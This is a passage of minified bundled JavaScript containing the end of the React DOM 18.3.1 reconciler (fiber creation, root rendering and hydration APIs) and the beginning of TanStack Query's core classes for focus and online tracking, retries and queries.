            for (yt = sr(t.stateNode.containerInfo.firstChild), xt = t, ye = !0, Wt = null, n = ay(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling;
        else {
          if (Ls(), r === s) {
            t = Rn(e, t, n);
            break e
          }
          et(e, t, r, n)
        }
        t = t.child
      }
      return t;
    case 5:
      return uy(t), e === null && _u(t), r = t.type, s = t.pendingProps, o = e !== null ? e.memoizedProps : null, i = s.children, Tu(r, s) ? i = null : o !== null && Tu(r, o) && (t.flags |= 32), Iy(e, t), et(e, t, i, n), t.child;
    case 6:
      return e === null && _u(t), null;
    case 13:
      return Oy(e, t, n);
    case 4:
      return tf(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = Os(t, null, r, n) : et(e, t, r, n), t.child;
    case 11:
      return r = t.type, s = t.pendingProps, s = t.elementType === r ? s : zt(r, s), vm(e, t, r, s, n);
    case 7:
      return et(e, t, t.pendingProps, n), t.child;
    case 8:
      return et(e, t, t.pendingProps.children, n), t.child;
    case 12:
      return et(e, t, t.pendingProps.children, n), t.child;
    case 10:
      e: {
        if (r = t.type._context, s = t.pendingProps, o = t.memoizedProps, i = s.value, de($a, r._currentValue), r._currentValue = i, o !== null)
          if (qt(o.value, i)) {
            if (o.children === s.children && !ut.current) {
              t = Rn(e, t, n);
              break e
            }
          } else
            for (o = t.child, o !== null && (o.return = t); o !== null;) {
              var a = o.dependencies;
              if (a !== null) {
                i = o.child;
                for (var c = a.firstContext; c !== null;) {
                  if (c.context === r) {
                    if (o.tag === 1) {
                      c = Nn(-1, n & -n), c.tag = 2;
                      var u = o.updateQueue;
                      if (u !== null) {
                        u = u.shared;
                        var d = u.pending;
                        d === null ? c.next = c : (c.next = d.next, d.next = c), u.pending = c
                      }
                    }
                    o.lanes |= n, c = o.alternate, c !== null && (c.lanes |= n), Iu(o.return, n, t), a.lanes |= n;
                    break
                  }
                  c = c.next
                }
              } else if (o.tag === 10) i = o.type === t.type ? null : o.child;
              else if (o.tag === 18) {
                if (i = o.return, i === null) throw Error(O(341));
                i.lanes |= n, a = i.alternate, a !== null && (a.lanes |= n), Iu(i, n, t), i = o.sibling
              } else i = o.child;
              if (i !== null) i.return = o;
              else
                for (i = o; i !== null;) {
                  if (i === t) {
                    i = null;
                    break
                  }
                  if (o = i.sibling, o !== null) {
                    o.return = i.return, i = o;
                    break
                  }
                  i = i.return
                }
              o = i
            }
        et(e, t, s.children, n),
          t = t.child
      }
      return t;
    case 9:
      return s = t.type, r = t.pendingProps.children, Ss(t, n), s = Lt(s), r = r(s), t.flags |= 1, et(e, t, r, n), t.child;
    case 14:
      return r = t.type, s = zt(r, t.pendingProps), s = zt(r.type, s), xm(e, t, r, s, n);
    case 15:
      return My(e, t, t.type, t.pendingProps, n);
    case 17:
      return r = t.type, s = t.pendingProps, s = t.elementType === r ? s : zt(r, s), xa(e, t), t.tag = 1, dt(r) ? (e = !0, Ba(t)) : e = !1, Ss(t, n), ky(t, r, s), Ou(t, r, s, n), Bu(null, t, r, !0, e, n);
    case 19:
      return Fy(e, t, n);
    case 22:
      return _y(e, t, n)
  }
  throw Error(O(156, t.tag))
};

function ev(e, t) {
  return P0(e, t)
}

function zb(e, t, n, r) {
  this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
}

function Mt(e, t, n, r) {
  return new zb(e, t, n, r)
}

function yf(e) {
  return e = e.prototype, !(!e || !e.isReactComponent)
}

function Ub(e) {
  if (typeof e == "function") return yf(e) ? 1 : 0;
  if (e != null) {
    if (e = e.$$typeof, e === Id) return 11;
    if (e === Ld) return 14
  }
  return 2
}

function lr(e, t) {
  var n = e.alternate;
  return n === null ? (n = Mt(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
    lanes: t.lanes,
    firstContext: t.firstContext
  }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
}

function Sa(e, t, n, r, s, o) {
  var i = 2;
  if (r = e, typeof e == "function") yf(e) && (i = 1);
  else if (typeof e == "string") i = 5;
  else e: switch (e) {
    case ns:
      return Or(n.children, s, o, t);
    case _d:
      i = 8, s |= 8;
      break;
    case au:
      return e = Mt(12, n, t, s | 2), e.elementType = au, e.lanes = o, e;
    case lu:
      return e = Mt(13, n, t, s), e.elementType = lu, e.lanes = o, e;
    case cu:
      return e = Mt(19, n, t, s), e.elementType = cu, e.lanes = o, e;
    case u0:
      return Pl(n, s, o, t);
    default:
      if (typeof e == "object" && e !== null) switch (e.$$typeof) {
        case l0:
          i = 10;
          break e;
        case c0:
          i = 9;
          break e;
        case Id:
          i = 11;
          break e;
        case Ld:
          i = 14;
          break e;
        case Un:
          i = 16, r = null;
          break e
      }
      throw Error(O(130, e == null ? e : typeof e, ""))
  }
  return t = Mt(i, n, t, s), t.elementType = e, t.type = r, t.lanes = o, t
}

function Or(e, t, n, r) {
  return e = Mt(7, e, r, t), e.lanes = n, e
}

function Pl(e, t, n, r) {
  return e = Mt(22, e, r, t), e.elementType = u0, e.lanes = n, e.stateNode = {
    isHidden: !1
  }, e
}

function Ec(e, t, n) {
  return e = Mt(6, e, null, t), e.lanes = n, e
}

function Tc(e, t, n) {
  return t = Mt(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
    containerInfo: e.containerInfo,
    pendingChildren: null,
    implementation: e.implementation
  }, t
}

function $b(e, t, n, r, s) {
  this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = cc(0), this.expirationTimes = cc(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = cc(0), this.identifierPrefix = r, this.onRecoverableError = s, this.mutableSourceEagerHydrationData = null
}

function vf(e, t, n, r, s, o, i, a, c) {
  return e = new $b(e, t, n, a, c), t === 1 ? (t = 1, o === !0 && (t |= 8)) : t = 0, o = Mt(3, null, null, t), e.current = o, o.stateNode = e, o.memoizedState = {
    element: r,
    isDehydrated: n,
    cache: null,
    transitions: null,
    pendingSuspenseBoundaries: null
  }, ef(o), e
}

function Hb(e, t, n) {
  var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
  return {
    $$typeof: ts,
    key: r == null ? null : "" + r,
    children: e,
    containerInfo: t,
    implementation: n
  }
}

function tv(e) {
  if (!e) return fr;
  e = e._reactInternals;
  e: {
    if (Kr(e) !== e || e.tag !== 1) throw Error(O(170));
    var t = e; do {
      switch (t.tag) {
        case 3:
          t = t.stateNode.context;
          break e;
        case 1:
          if (dt(t.type)) {
            t = t.stateNode.__reactInternalMemoizedMergedChildContext;
            break e
          }
      }
      t = t.return
    } while (t !== null);
    throw Error(O(171))
  }
  if (e.tag === 1) {
    var n = e.type;
    if (dt(n)) return ty(e, n, t)
  }
  return t
}

function nv(e, t, n, r, s, o, i, a, c) {
  return e = vf(n, r, !0, e, s, o, i, a, c), e.context = tv(null), n = e.current, r = st(), s = ar(n), o = Nn(r, s), o.callback = t ?? null, or(n, o, s), e.current.lanes = s, xi(e, s, r), ft(e, r), e
}

function El(e, t, n, r) {
  var s = t.current,
    o = st(),
    i = ar(s);
  return n = tv(n), t.context === null ? t.context = n : t.pendingContext = n, t = Nn(o, i), t.payload = {
    element: e
  }, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = or(s, t, i), e !== null && (Gt(e, s, i, o), ga(e, s, i)), i
}

function Za(e) {
  if (e = e.current, !e.child) return null;
  switch (e.child.tag) {
    case 5:
      return e.child.stateNode;
    default:
      return e.child.stateNode
  }
}

function Rm(e, t) {
  if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
    var n = e.retryLane;
    e.retryLane = n !== 0 && n < t ? n : t
  }
}

function xf(e, t) {
  Rm(e, t), (e = e.alternate) && Rm(e, t)
}

function Wb() {
  return null
}
var rv = typeof reportError == "function" ? reportError : function (e) {
  console.error(e)
};

function wf(e) {
  this._internalRoot = e
}
Tl.prototype.render = wf.prototype.render = function (e) {
  var t = this._internalRoot;
  if (t === null) throw Error(O(409));
  El(e, t, null, null)
};
Tl.prototype.unmount = wf.prototype.unmount = function () {
  var e = this._internalRoot;
  if (e !== null) {
    this._internalRoot = null;
    var t = e.containerInfo;
    $r(function () {
      El(null, e, null, null)
    }), t[Tn] = null
  }
};

function Tl(e) {
  this._internalRoot = e
}
Tl.prototype.unstable_scheduleHydration = function (e) {
  if (e) {
    var t = _0();
    e = {
      blockedOn: null,
      target: e,
      priority: t
    };
    for (var n = 0; n < Hn.length && t !== 0 && t < Hn[n].priority; n++);
    Hn.splice(n, 0, e), n === 0 && L0(e)
  }
};

function bf(e) {
  return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}

function kl(e) {
  return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}

function Dm() { }

function Kb(e, t, n, r, s) {
  if (s) {
    if (typeof r == "function") {
      var o = r;
      r = function () {
        var u = Za(i);
        o.call(u)
      }
    }
    var i = nv(t, r, e, 0, null, !1, !1, "", Dm);
    return e._reactRootContainer = i, e[Tn] = i.current, Xo(e.nodeType === 8 ? e.parentNode : e), $r(), i
  }
  for (; s = e.lastChild;) e.removeChild(s);
  if (typeof r == "function") {
    var a = r;
    r = function () {
      var u = Za(c);
      a.call(u)
    }
  }
  var c = vf(e, 0, !1, null, null, !1, !1, "", Dm);
  return e._reactRootContainer = c, e[Tn] = c.current, Xo(e.nodeType === 8 ? e.parentNode : e), $r(function () {
    El(t, c, n, r)
  }), c
}

function Rl(e, t, n, r, s) {
  var o = n._reactRootContainer;
  if (o) {
    var i = o;
    if (typeof s == "function") {
      var a = s;
      s = function () {
        var c = Za(i);
        a.call(c)
      }
    }
    El(t, i, e, s)
  } else i = Kb(n, t, e, s, r);
  return Za(i)
}
D0 = function (e) {
  switch (e.tag) {
    case 3:
      var t = e.stateNode;
      if (t.current.memoizedState.isDehydrated) {
        var n = No(t.pendingLanes);
        n !== 0 && (Vd(t, n | 1), ft(t, Pe()), !(ie & 6) && (Bs = Pe() + 500, yr()))
      }
      break;
    case 13:
      $r(function () {
        var r = kn(e, 1);
        if (r !== null) {
          var s = st();
          Gt(r, e, 1, s)
        }
      }), xf(e, 1)
  }
};
Bd = function (e) {
  if (e.tag === 13) {
    var t = kn(e, 134217728);
    if (t !== null) {
      var n = st();
      Gt(t, e, 134217728, n)
    }
    xf(e, 134217728)
  }
};
M0 = function (e) {
  if (e.tag === 13) {
    var t = ar(e),
      n = kn(e, t);
    if (n !== null) {
      var r = st();
      Gt(n, e, t, r)
    }
    xf(e, t)
  }
};
_0 = function () {
  return le
};
I0 = function (e, t) {
  var n = le;
  try {
    return le = e, t()
  } finally {
    le = n
  }
};
xu = function (e, t, n) {
  switch (t) {
    case "input":
      if (fu(e, n), t = n.name, n.type === "radio" && t != null) {
        for (n = e; n.parentNode;) n = n.parentNode;
        for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
          var r = n[t];
          if (r !== e && r.form === e.form) {
            var s = bl(r);
            if (!s) throw Error(O(90));
            f0(r), fu(r, s)
          }
        }
      }
      break;
    case "textarea":
      m0(e, n);
      break;
    case "select":
      t = n.value, t != null && vs(e, !!n.multiple, t, !1)
  }
};
b0 = mf;
S0 = $r;
var Qb = {
  usingClientEntryPoint: !1,
  Events: [bi, is, bl, x0, w0, mf]
},
  po = {
    findFiberByHostInstance: Pr,
    bundleType: 0,
    version: "18.3.1",
    rendererPackageName: "react-dom"
  },
  Gb = {
    bundleType: po.bundleType,
    version: po.version,
    rendererPackageName: po.rendererPackageName,
    rendererConfig: po.rendererConfig,
    overrideHookState: null,
    overrideHookStateDeletePath: null,
    overrideHookStateRenamePath: null,
    overrideProps: null,
    overridePropsDeletePath: null,
    overridePropsRenamePath: null,
    setErrorHandler: null,
    setSuspenseHandler: null,
    scheduleUpdate: null,
    currentDispatcherRef: _n.ReactCurrentDispatcher,
    findHostInstanceByFiber: function (e) {
      return e = j0(e), e === null ? null : e.stateNode
    },
    findFiberByHostInstance: po.findFiberByHostInstance || Wb,
    findHostInstancesForRefresh: null,
    scheduleRefresh: null,
    scheduleRoot: null,
    setRefreshHandler: null,
    getCurrentFiber: null,
    reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
  };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
  var ta = __REACT_DEVTOOLS_GLOBAL_HOOK__;
  if (!ta.isDisabled && ta.supportsFiber) try {
    yl = ta.inject(Gb), sn = ta
  } catch { }
}
St.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Qb;
St.createPortal = function (e, t) {
  var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
  if (!bf(t)) throw Error(O(200));
  return Hb(e, t, null, n)
};
St.createRoot = function (e, t) {
  if (!bf(e)) throw Error(O(299));
  var n = !1,
    r = "",
    s = rv;
  return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (s = t.onRecoverableError)), t = vf(e, 1, !1, null, null, n, !1, r, s), e[Tn] = t.current, Xo(e.nodeType === 8 ? e.parentNode : e), new wf(t)
};
St.findDOMNode = function (e) {
  if (e == null) return null;
  if (e.nodeType === 1) return e;
  var t = e._reactInternals;
  if (t === void 0) throw typeof e.render == "function" ? Error(O(188)) : (e = Object.keys(e).join(","), Error(O(268, e)));
  return e = j0(t), e = e === null ? null : e.stateNode, e
};
St.flushSync = function (e) {
  return $r(e)
};
St.hydrate = function (e, t, n) {
  if (!kl(t)) throw Error(O(200));
  return Rl(null, e, t, !0, n)
};
St.hydrateRoot = function (e, t, n) {
  if (!bf(e)) throw Error(O(405));
  var r = n != null && n.hydratedSources || null,
    s = !1,
    o = "",
    i = rv;
  if (n != null && (n.unstable_strictMode === !0 && (s = !0), n.identifierPrefix !== void 0 && (o = n.identifierPrefix), n.onRecoverableError !== void 0 && (i = n.onRecoverableError)), t = nv(t, null, e, 1, n ?? null, s, !1, o, i), e[Tn] = t.current, Xo(e), r)
    for (e = 0; e < r.length; e++) n = r[e], s = n._getVersion, s = s(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, s] : t.mutableSourceEagerHydrationData.push(n, s);
  return new Tl(t)
};
St.render = function (e, t, n) {
  if (!kl(t)) throw Error(O(200));
  return Rl(null, e, t, !1, n)
};
St.unmountComponentAtNode = function (e) {
  if (!kl(e)) throw Error(O(40));
  return e._reactRootContainer ? ($r(function () {
    Rl(null, null, e, !1, function () {
      e._reactRootContainer = null, e[Tn] = null
    })
  }), !0) : !1
};
St.unstable_batchedUpdates = mf;
St.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
  if (!kl(n)) throw Error(O(200));
  if (e == null || e._reactInternals === void 0) throw Error(O(38));
  return Rl(e, t, n, !1, r)
};
St.version = "18.3.1-next-f1338f8080-20240426";

function sv() {
  if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
    __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(sv)
  } catch (e) {
    console.error(e)
  }
}
sv(), s0.exports = St;
var Dl = s0.exports;
const qb = Kg(Dl);
var ov, Mm = Dl;
ov = Mm.createRoot, Mm.hydrateRoot;
var Ml = class {
  constructor() {
    this.listeners = new Set, this.subscribe = this.subscribe.bind(this)
  }
  subscribe(e) {
    return this.listeners.add(e), this.onSubscribe(), () => {
      this.listeners.delete(e), this.onUnsubscribe()
    }
  }
  hasListeners() {
    return this.listeners.size > 0
  }
  onSubscribe() { }
  onUnsubscribe() { }
},
  _l = typeof window > "u" || "Deno" in globalThis;

function Ut() { }

function Yb(e, t) {
  return typeof e == "function" ? e(t) : e
}

function Xb(e) {
  return typeof e == "number" && e >= 0 && e !== 1 / 0
}

function Jb(e, t) {
  return Math.max(e + (t || 0) - Date.now(), 0)
}

function _m(e, t) {
  return typeof e == "function" ? e(t) : e
}

function Zb(e, t) {
  return typeof e == "function" ? e(t) : e
}

function Im(e, t) {
  const {
    type: n = "all",
    exact: r,
    fetchStatus: s,
    predicate: o,
    queryKey: i,
    stale: a
  } = e;
  if (i) {
    if (r) {
      if (t.queryHash !== Sf(i, t.options)) return !1
    } else if (!ai(t.queryKey, i)) return !1
  }
  if (n !== "all") {
    const c = t.isActive();
    if (n === "active" && !c || n === "inactive" && c) return !1
  }
  return !(typeof a == "boolean" && t.isStale() !== a || s && s !== t.state.fetchStatus || o && !o(t))
}

function Lm(e, t) {
  const {
    exact: n,
    status: r,
    predicate: s,
    mutationKey: o
  } = e;
  if (o) {
    if (!t.options.mutationKey) return !1;
    if (n) {
      if (ii(t.options.mutationKey) !== ii(o)) return !1
    } else if (!ai(t.options.mutationKey, o)) return !1
  }
  return !(r && t.state.status !== r || s && !s(t))
}

function Sf(e, t) {
  return ((t == null ? void 0 : t.queryKeyHashFn) || ii)(e)
}

function ii(e) {
  return JSON.stringify(e, (t, n) => Ju(n) ? Object.keys(n).sort().reduce((r, s) => (r[s] = n[s], r), {}) : n)
}

function ai(e, t) {
  return e === t ? !0 : typeof e != typeof t ? !1 : e && t && typeof e == "object" && typeof t == "object" ? !Object.keys(t).some(n => !ai(e[n], t[n])) : !1
}

function iv(e, t) {
  if (e === t) return e;
  const n = Om(e) && Om(t);
  if (n || Ju(e) && Ju(t)) {
    const r = n ? e : Object.keys(e),
      s = r.length,
      o = n ? t : Object.keys(t),
      i = o.length,
      a = n ? [] : {};
    let c = 0;
    for (let u = 0; u < i; u++) {
      const d = n ? u : o[u];
      (!n && r.includes(d) || n) && e[d] === void 0 && t[d] === void 0 ? (a[d] = void 0, c++) : (a[d] = iv(e[d], t[d]), a[d] === e[d] && e[d] !== void 0 && c++)
    }
    return s === i && c === s ? e : a
  }
  return t
}

function Om(e) {
  return Array.isArray(e) && e.length === Object.keys(e).length
}

function Ju(e) {
  if (!Fm(e)) return !1;
  const t = e.constructor;
  if (t === void 0) return !0;
  const n = t.prototype;
  return !(!Fm(n) || !n.hasOwnProperty("isPrototypeOf") || Object.getPrototypeOf(e) !== Object.prototype)
}

function Fm(e) {
  return Object.prototype.toString.call(e) === "[object Object]"
}

function eS(e) {
  return new Promise(t => {
    setTimeout(t, e)
  })
}

function tS(e, t, n) {
  return typeof n.structuralSharing == "function" ? n.structuralSharing(e, t) : n.structuralSharing !== !1 ? iv(e, t) : t
}

function nS(e, t, n = 0) {
  const r = [...e, t];
  return n && r.length > n ? r.slice(1) : r
}

function rS(e, t, n = 0) {
  const r = [t, ...e];
  return n && r.length > n ? r.slice(0, -1) : r
}
var Cf = Symbol();

function av(e, t) {
  return !e.queryFn && (t != null && t.initialPromise) ? () => t.initialPromise : !e.queryFn || e.queryFn === Cf ? () => Promise.reject(new Error(`Missing queryFn: '${e.queryHash}'`)) : e.queryFn
}
var Dr, Qn, js, Fg, sS = (Fg = class extends Ml {
  constructor() {
    super();
    ae(this, Dr);
    ae(this, Qn);
    ae(this, js);
    ne(this, js, t => {
      if (!_l && window.addEventListener) {
        const n = () => t();
        return window.addEventListener("visibilitychange", n, !1), () => {
          window.removeEventListener("visibilitychange", n)
        }
      }
    })
  }
  onSubscribe() {
    k(this, Qn) || this.setEventListener(k(this, js))
  }
  onUnsubscribe() {
    var t;
    this.hasListeners() || ((t = k(this, Qn)) == null || t.call(this), ne(this, Qn, void 0))
  }
  setEventListener(t) {
    var n;
    ne(this, js, t), (n = k(this, Qn)) == null || n.call(this), ne(this, Qn, t(r => {
      typeof r == "boolean" ? this.setFocused(r) : this.onFocus()
    }))
  }
  setFocused(t) {
    k(this, Dr) !== t && (ne(this, Dr, t), this.onFocus())
  }
  onFocus() {
    const t = this.isFocused();
    this.listeners.forEach(n => {
      n(t)
    })
  }
  isFocused() {
    var t;
    return typeof k(this, Dr) == "boolean" ? k(this, Dr) : ((t = globalThis.document) == null ? void 0 : t.visibilityState) !== "hidden"
  }
}, Dr = new WeakMap, Qn = new WeakMap, js = new WeakMap, Fg),
  lv = new sS,
  As, Gn, Ps, Vg, oS = (Vg = class extends Ml {
    constructor() {
      super();
      ae(this, As, !0);
      ae(this, Gn);
      ae(this, Ps);
      ne(this, Ps, t => {
        if (!_l && window.addEventListener) {
          const n = () => t(!0),
            r = () => t(!1);
          return window.addEventListener("online", n, !1), window.addEventListener("offline", r, !1), () => {
            window.removeEventListener("online", n), window.removeEventListener("offline", r)
          }
        }
      })
    }
    onSubscribe() {
      k(this, Gn) || this.setEventListener(k(this, Ps))
    }
    onUnsubscribe() {
      var t;
      this.hasListeners() || ((t = k(this, Gn)) == null || t.call(this), ne(this, Gn, void 0))
    }
    setEventListener(t) {
      var n;
      ne(this, Ps, t), (n = k(this, Gn)) == null || n.call(this), ne(this, Gn, t(this.setOnline.bind(this)))
    }
    setOnline(t) {
      k(this, As) !== t && (ne(this, As, t), this.listeners.forEach(r => {
        r(t)
      }))
    }
    isOnline() {
      return k(this, As)
    }
  }, As = new WeakMap, Gn = new WeakMap, Ps = new WeakMap, Vg),
  el = new oS;

function iS() {
  let e, t;
  const n = new Promise((s, o) => {
    e = s, t = o
  });
  n.status = "pending", n.catch(() => { });

  function r(s) {
    Object.assign(n, s), delete n.resolve, delete n.reject
  }
  return n.resolve = s => {
    r({
      status: "fulfilled",
      value: s
    }), e(s)
  }, n.reject = s => {
    r({
      status: "rejected",
      reason: s
    }), t(s)
  }, n
}

function aS(e) {
  return Math.min(1e3 * 2 ** e, 3e4)
}

function cv(e) {
  return (e ?? "online") === "online" ? el.isOnline() : !0
}
var uv = class extends Error {
  constructor(e) {
    super("CancelledError"), this.revert = e == null ? void 0 : e.revert, this.silent = e == null ? void 0 : e.silent
  }
};

function kc(e) {
  return e instanceof uv
}

function dv(e) {
  let t = !1,
    n = 0,
    r = !1,
    s;
  const o = iS(),
    i = v => {
      var S;
      r || (h(new uv(v)), (S = e.abort) == null || S.call(e))
    },
    a = () => {
      t = !0
    },
    c = () => {
      t = !1
    },
    u = () => lv.isFocused() && (e.networkMode === "always" || el.isOnline()) && e.canRun(),
    d = () => cv(e.networkMode) && e.canRun(),
    f = v => {
      var S;
      r || (r = !0, (S = e.onSuccess) == null || S.call(e, v), s == null || s(), o.resolve(v))
    },
    h = v => {
      var S;
      r || (r = !0, (S = e.onError) == null || S.call(e, v), s == null || s(), o.reject(v))
    },
    y = () => new Promise(v => {
      var S;
      s = g => {
        (r || u()) && v(g)
      }, (S = e.onPause) == null || S.call(e)
    }).then(() => {
      var v;
      s = void 0, r || (v = e.onContinue) == null || v.call(e)
    }),
    w = () => {
      if (r) return;
      let v;
      const S = n === 0 ? e.initialPromise : void 0;
      try {
        v = S ?? e.fn()
      } catch (g) {
        v = Promise.reject(g)
      }
      Promise.resolve(v).then(f).catch(g => {
        var j;
        if (r) return;
        const p = e.retry ?? (_l ? 0 : 3),
          m = e.retryDelay ?? aS,
          b = typeof m == "function" ? m(n, g) : m,
          C = p === !0 || typeof p == "number" && n < p || typeof p == "function" && p(n, g);
        if (t || !C) {
          h(g);
          return
        }
        n++, (j = e.onFail) == null || j.call(e, n, g), eS(b).then(() => u() ? void 0 : y()).then(() => {
          t ? h(g) : w()
        })
      })
    };
  return {
    promise: o,
    cancel: i,
    continue: () => (s == null || s(), o),
    cancelRetry: a,
    continueRetry: c,
    canStart: d,
    start: () => (d() ? w() : y().then(w), o)
  }
}

function lS() {
  let e = [],
    t = 0,
    n = a => {
      a()
    },
    r = a => {
      a()
    },
    s = a => setTimeout(a, 0);
  const o = a => {
    t ? e.push(a) : s(() => {
      n(a)
    })
  },
    i = () => {
      const a = e;
      e = [], a.length && s(() => {
        r(() => {
          a.forEach(c => {
            n(c)
          })
        })
      })
    };
  return {
    batch: a => {
      let c;
      t++;
      try {
        c = a()
      } finally {
        t--, t || i()
      }
      return c
    },
    batchCalls: a => (...c) => {
      o(() => {
        a(...c)
      })
    },
    schedule: o,
    setNotifyFunction: a => {
      n = a
    },
    setBatchNotifyFunction: a => {
      r = a
    },
    setScheduler: a => {
      s = a
    }
  }
}
var nt = lS(),
  Mr, Bg, fv = (Bg = class {
    constructor() {
      ae(this, Mr)
    }
    destroy() {
      this.clearGcTimeout()
    }
    scheduleGc() {
      this.clearGcTimeout(), Xb(this.gcTime) && ne(this, Mr, setTimeout(() => {
        this.optionalRemove()
      }, this.gcTime))
    }
    updateGcTime(e) {
      this.gcTime = Math.max(this.gcTime || 0, e ?? (_l ? 1 / 0 : 5 * 60 * 1e3))
    }
    clearGcTimeout() {
      k(this, Mr) && (clearTimeout(k(this, Mr)), ne(this, Mr, void 0))
    }
  }, Mr = new WeakMap, Bg),
  Es, Ts, kt, Ke, gi, _r, $t, pn, zg, cS = (zg = class extends fv {
    constructor(t) {
      super();
      ae(this, $t);
      ae(this, Es);
      ae(this, Ts);
      ae(this, kt);
      ae(this, Ke);
      ae(this, gi);
      ae(this, _r);
      ne(this, _r, !1), ne(this, gi, t.defaultOptions), this.setOptions(t.options), this.observers = [], ne(this, kt, t.cache), this.queryKey = t.queryKey, this.queryHash = t.queryHash, ne(this, Es, dS(this.options)), this.state = t.state ?? k(this, Es), this.scheduleGc()
    }
    get meta() {
      return this.options.meta
    }
    get promise() {
      var t;
      return (t = k(this, Ke)) == null ? void 0 : t.promise
    }
    setOptions(t) {
      this.options = {
        ...k(this, gi),
        ...t
      }, this.updateGcTime(this.options.gcTime)
    }
    optionalRemove() {
      !this.observers.length && this.state.fetchStatus === "idle" && k(this, kt).remove(this)
    }
    setData(t, n) {
      const r = tS(this.state.data, t, this.options);
      return $e(this, $t, pn).call(this, {
        data: r,
        type: "success",
        dataUpdatedAt: n == null ? void 0 : n.updatedAt,
        manual: n == null ? void 0 : n.manual
      }), r
    }
    setState(t, n) {
      $e(this, $t, pn).call(this, {
        type: "setState",
        state: t,
        setStateOptions: n
      })
    }
    cancel(t) {
      var r, s;
      const n = (r = k(this, Ke)) == null ? void 0 : r.promise;
      return (s = k(this, Ke)) == null || s.cancel(t), n ? n.then(Ut).catch(Ut) : Promise.resolve()
    }
    destroy() {
      super.destroy(), this.cancel({
        silent: !0
      })
    }
    reset() {
      this.destroy(), this.setState(k(this, Es))
    }
    isActive() {
      return this.observers.some(t => Zb(t.options.enabled, this) !== !1)
    }
    isDisabled() {
      return this.getObserversCount() > 0 ? !this.isActive() : this.options.queryFn === Cf || this.state.dataUpdateCount + this.state.errorUpdateCount === 0
    }
    isStale() {
      return this.state.isInvalidated ? !0 : this.getObserversCount() > 0 ? this.observers.some(t => t.getCurrentResult().isStale) : this.state.data === void 0
    }
    isStaleByTime(t = 0) {
      return this.state.isInvalidated || this.state.data === void 0 || !Jb(this.state.dataUpdatedAt, t)
    }
    onFocus() {
      var n;
      const t = this.observers.find(r => r.shouldFetchOnWindowFocus());
      t == null || t.refetch({
        cancelRefetch: !1
      }), (n = k(this, Ke)) == null || n.continue()
    }
    onOnline() {
      var n;
      const t = this.observers.find(r => r.shouldFetchOnReconnect());
      t == null || t.refetch({
        cancelRefetch: !1
      }), (n = k(this, Ke)) == null || n.continue()
    }
    addObserver(t) {
      this.observers.includes(t) || (this.observers.push(t), this.clearGcTimeout(), k(this, kt).notify({
        type: "observerAdded",
        query: this,
        observer: t
      }))
    }
    removeObserver(t) {
      this.observers.includes(t) && (this.observers = this.observers.filter(n => n !== t), this.observers.length || (k(this, Ke) && (k(this, _r) ? k(this, Ke).cancel({
        revert: !0
      }) : k(this, Ke).cancelRetry()), this.scheduleGc()), k(this, kt).notify({
        type: "observerRemoved",
        query: this,
        observer: t
      }))
    }
    getObserversCount() {
      return this.observers.length
    }
    invalidate() {
      this.state.isInvalidated || $e(this, $t, pn).call(this, {
        type: "invalidate"
      })
    }
    fetch(t, n) {
      var c, u, d;
      if (this.state.fetchStatus !== "idle") {
        if (this.state.data !== void 0 && (n != null && n.cancelRefetch)) this.cancel({
          silent: !0
        });
        else if (k(this, Ke)) return k(this, Ke).continueRetry(), k(this, Ke).promise
      }
      if (t && this.setOptions(t), !this.options.queryFn) {
        const f = this.observers.find(h => h.options.queryFn);
        f && this.setOptions(f.options)
      }
      const r = new AbortController,
        s = f => {
          Object.defineProperty(f, "signal", {
            enumerable: !0,
            get: () => (ne(this, _r, !0), r.signal)
          })
        },
        o = () => {
          const f = av(this.options, n),
            h = {
              queryKey: this.queryKey,
              meta: this.meta
            };
          return s(h), ne(this, _r, !1), this.options.persister ? this.options.persister(f, h, this) : f(h)
        },
        i = {
          fetchOptions: n,
          options: this.options,
          queryKey: this.queryKey,
          state: this.state,
          fetchFn: o
        };
